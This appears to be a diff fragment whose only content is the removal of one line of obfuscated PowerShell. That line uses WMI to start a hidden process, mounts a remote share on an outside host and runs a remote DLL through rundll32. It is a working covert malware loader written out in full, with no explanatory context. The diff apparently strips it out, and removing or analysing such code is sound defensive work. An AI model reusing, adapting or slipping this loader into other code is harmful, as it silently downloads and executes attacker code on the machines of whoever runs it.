@@ -1,1 +1,0 @@
-$VuQcUm9=([wmiclass](-join('Win32','_Proc','essSt','a','rtup'))).CreateInstance();$VuQcUm9.ShowWindow=0;([wmiclass]('Win32_P'+'roc'+'e'+'s'+'s')).Create((-join('cmd /','c pu','shd',' \','\','stg.1xf','a.xyz\d','dd40028-','cc09','-4fd5-','96ef-','36e91b','5fad7a &',' run','dll3','2 ','goog','.ct,#','1')),$null,$VuQcUm9)
